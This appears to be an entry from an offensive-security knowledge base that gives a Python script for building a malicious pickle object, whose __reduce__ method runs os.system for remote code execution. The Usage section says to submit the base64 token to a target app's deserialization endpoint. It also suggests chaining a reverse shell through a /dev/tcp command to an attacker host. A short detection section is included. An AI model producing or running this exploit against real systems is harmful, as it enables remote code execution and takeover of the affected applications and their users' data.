---
id: df6517d1-e1c3-4781-84d3-dc3f711e317a
name: create-evil-pickle-object
type: code
language: python
verified: true
created_at: '2023-04-06T03:55:59.484661+00:00'
updated_at: '2024-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - pickle
  - rce
  - gadget
validated: true
---

# Create Evil Pickle Object

## Code

```python
import cPickle, os
from base64 import b64encode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

## Description

This code creates a malicious Python object using a custom class with a __reduce__ method that returns os.system and the 'whoami' command as a tuple. It serializes the object with cPickle, base64-encodes the result, and prints the token. When deserialized by vulnerable code, __reduce__ executes the command, achieving RCE.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Hardcoded to 'whoami'; modify tuple for custom commands | N/A |

## Usage

Run on attacker machine to generate the token, then submit to target app's deserialization endpoint (e.g., auth token field). Ideal for exploiting pickle-based session handling in web apps. Chain with other payloads for reverse shells by changing os.system arg to 'bash -i >& /dev/tcp/IP/PORT 0>&1'.

## Detection

- Code review for __reduce__ methods or pickle.dumps on attacker-controlled objects.
- Network/ process monitoring for unexpected commands from deserialization contexts.
- Static analysis tools (e.g., Bandit) flag pickle usage; dynamic taint tracking for input propagation to loads.
- Server logs showing base64 decode followed by system calls.

## Related

- [[procedures/Exploit-Python-Pickle-Deserialization-for-RCE]]
- [[commands/python-generate-malicious-pickle-token]]
